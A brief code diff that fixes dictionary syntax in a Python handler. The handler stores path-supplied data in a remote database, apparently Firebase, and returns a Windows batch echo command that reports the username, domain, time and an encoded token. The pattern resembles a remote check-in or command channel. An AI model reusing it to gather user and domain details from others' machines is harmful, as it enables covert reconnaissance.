@@ -60,8 +60,8 @@ def x(path):
     #t = dt['t'].replace('+', ' ')
     data = dict()
     data['time'] = datetime.datetime.now().strftime("%I:%M:%S:%f%p on %B %d, %Y")
-    data.['data'] = dt
-    data.['raw'] = path[2:]
+    data['data'] = dt
+    data['raw'] = path[2:]
     fb.post('/',data)
     return "echo %TIME% %DATE% %USERNAME% %USERDOMAIN% %RANDOM% *VkcxR2ExcFhWblU9* test"
 
